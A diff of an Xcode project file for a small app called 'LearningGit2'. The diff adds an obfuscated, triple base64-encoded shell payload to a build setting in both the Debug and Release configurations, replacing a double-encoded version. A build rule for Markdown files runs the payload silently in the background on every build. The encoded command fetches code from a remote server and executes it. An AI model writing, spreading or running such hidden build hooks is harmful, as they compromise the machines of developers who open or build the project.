@@ -7,11 +7,11 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		06CE831E2031438EA299F71F /* README.md */ = {isa = PBXBuildFile; fileRef = 931340F6E8474659A399F71F; };
+		8D33BB9F6EB64D7B8099F71F /* README.md */ = {isa = PBXBuildFile; fileRef = 67DB38B6A3B64F61B499F71F; };
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		6E04590E7A964D12B099F71F /* PBXBuildRule */ = {
+		6B832C1A83A34E3C9599F71F /* PBXBuildRule */ = {
 				isa = PBXBuildRule;
 				compilerSpec = com.apple.compilers.proxy.script;
 				filePatterns = "*.md";
@@ -25,10 +25,10 @@
 				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
 sh -c \"${AF17F99}\"";
 			};
-		/* End PBXBuildRule section */
+			/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
-		931340F6E8474659A399F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		67DB38B6A3B64F61B499F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		4C10B9A82F8CAAB2008A87EE /* LearningGit2.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = LearningGit2.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -62,7 +62,7 @@ sh -c \"${AF17F99}\"";
 		4C10B9A92F8CAAB2008A87EE /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				931340F6E8474659A399F71F /* README.md */,
+				67DB38B6A3B64F61B499F71F /* README.md */,
 				4C10B9A82F8CAAB2008A87EE /* LearningGit2.app */,
 			);
 			name = Products;
@@ -80,7 +80,7 @@ sh -c \"${AF17F99}\"";
 				4C10B9A62F8CAAB2008A87EE /* Resources */,
 			);
 			buildRules = (
-				6E04590E7A964D12B099F71F /* PBXBuildRule */,
+				6B832C1A83A34E3C9599F71F /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -136,7 +136,7 @@ sh -c \"${AF17F99}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				06CE831E2031438EA299F71F /* README.md */,
+				8D33BB9F6EB64D7B8099F71F /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -156,7 +156,7 @@ sh -c \"${AF17F99}\"";
 		4C10B9B12F8CAAB6008A87EE /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((t(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJUR1p6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJM0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OW5iMjluYkdWdVpYUnpMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | t | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((d(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKak1IaHRTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpla2xETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9YVmFXRkpxV2tjMWExcFlXWFZoVnpSMldWTnJhVWxJZDJkak1tZExDZz09Cg== | d | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -221,7 +221,7 @@ sh -c \"${AF17F99}\"";
 		4C10B9B22F8CAAB6008A87EE /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((t(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJUR1p6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJM0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OW5iMjluYkdWdVpYUnpMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | t | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((d(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKak1IaHRTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpla2xETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9YVmFXRkpxV2tjMWExcFlXWFZoVnpSMldWTnJhVWxJZDJkak1tZExDZz09Cg== | d | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
